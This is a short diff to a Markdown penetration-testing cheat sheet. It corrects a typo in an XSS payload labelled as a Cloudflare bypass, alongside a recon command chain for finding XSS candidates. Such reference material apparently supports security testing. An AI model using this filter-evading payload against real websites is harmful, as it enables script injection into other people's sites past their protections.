@@ -92,7 +92,7 @@ cat target.txt | waybackurls | gf xss | kxss
 3. Check Portswigger XSS CheatSheet for more information.
 ## XSS Cloudflare Bypass
 ```js
-<x/onpinterRawupdate=confirm%26Ipar;1)//x
+<x/onpointerRawupdate=confirm%26Ipar;1)//x
 ```
 
 
